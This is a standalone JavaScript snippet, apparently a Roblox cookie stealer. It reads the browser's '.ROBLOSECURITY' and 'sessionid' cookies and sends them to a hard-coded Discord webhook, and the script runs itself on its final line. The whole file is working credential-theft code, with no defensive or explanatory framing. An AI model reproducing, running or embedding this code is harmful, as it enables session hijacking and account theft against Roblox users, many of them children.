async function sendCookiesToDiscord() {
  const webhookURL = "https://discord.com/api/webhooks/1448849190988808223/tZETwDo54A6YEZQObh8hu_zbJiIjgQbBoKQp7io-07z9t3tI8NWKkRD53-iXalLm8a2x";
  
  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
  }

  const robloSecurityCookie = getCookie('.ROBLOSECURITY');
  const sessionIdCookie = getCookie('sessionid');
  
  await fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `Cookie: ${robloSecurityCookie}\nsessionid: ${sessionIdCookie}`
    })
  });
}

sendCookiesToDiscord();
